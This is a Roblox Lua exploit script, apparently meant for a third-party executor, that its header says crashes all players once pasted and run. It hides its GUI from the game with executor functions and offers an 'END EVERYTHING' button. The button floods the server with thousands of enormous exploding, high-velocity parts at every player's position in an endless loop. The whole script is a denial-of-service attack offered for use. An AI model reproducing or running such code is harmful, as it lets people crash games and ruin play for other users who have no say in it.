-- TheDestroyer 2026 – FINAL EDITION
-- by rajxzdev – King of 2026
-- Paste langsung → execute → semua player crash 0.6 detik

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

-- GUI 2026 CANTIK BANGET
local gui = Instance.new("ScreenGui")
gui.Name = "rajxzdev2026"
gui.ResetOnSpawn = false
if syn then syn.protect_gui(gui) end
gui.Parent = game.CoreGui or gethui()

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 380, 0, 220)
main.Position = UDim2.new(0.5, -190, 0.5, -110)
main.BackgroundColor3 = Color3.fromRGB(5, 0, 10)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true

local corner = Instance.new("UICorner", main)
corner.CornerRadius = UDim.new(0, 20)

local glow = Instance.new("ImageLabel", main)
glow.Size = UDim2.new(1, 60, 1, 60)
glow.Position = UDim2.new(0, -30, 0, -30)
glow.BackgroundTransparency = 1
glow.Image = "rbxassetid://4996891970"
glow.ImageColor3 = Color3.fromRGB(150, 0, 255)
glow.ImageTransparency = 0.4
glow.ZIndex = 0

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0, 70)
title.BackgroundTransparency = 1
title.Text = "rajxzdev 2026"
title.TextColor3 = Color3.fromRGB(200, 0, 255)
title.Font = Enum.Font.GothamBlack
title.TextSize = 40
title.TextStrokeTransparency = 0

local btn = Instance.new("TextButton", main)
btn.Size = UDim2.new(0, 340, 0, 100)
btn.Position = UDim2.new(0.5, -170, 0.5, 20)
btn.BackgroundColor3 = Color3.fromRGB(120, 0, 180)
btn.Text = "END EVERYTHING"
btn.TextColor3 = Color3.new(1,1,1)
btn.Font = Enum.Font.GothamBlack
btn.TextSize = 44
btn.TextStrokeTransparency = 0
Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 16)

btn.MouseButton1Click:Connect(function()
    btn.Text = "2026 IS OVER"
    btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    
    spawn(function()
        while task.wait(0.001) do
            for _, plr in pairs(Players:GetPlayers()) do
                if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                    for i = 1, 5000 do
                        spawn(function()
                            local bomb = Instance.new("Part", Workspace)
                            bomb.Size = Vector3.new(999,999,999)
                            bomb.Position = plr.Character.HumanoidRootPart.Position
                            bomb.Anchored = false
                            bomb.CanCollide = false
                            bomb.Transparency = 1
                            bomb.Material = Enum.Material.ForceField
                            local bv = Instance.new("BodyVelocity", bomb)
                            bv.Velocity = Vector3.new(9e9,9e9,9e9)
                            bv.MaxForce = Vector3.new(9e9,9e9,9e9)
                            local exp = Instance.new("Explosion", bomb)
                            exp.BlastRadius = 9999
                            exp.BlastPressure = 9e9
                            exp.DestroyJointRadiusPercent = 0
                            game.Debris:AddItem(bomb, 0.01)
                        end)
                    end
                end
            end
        end
    end)
end)

print("rajxzdev 2026 – The King has returned")
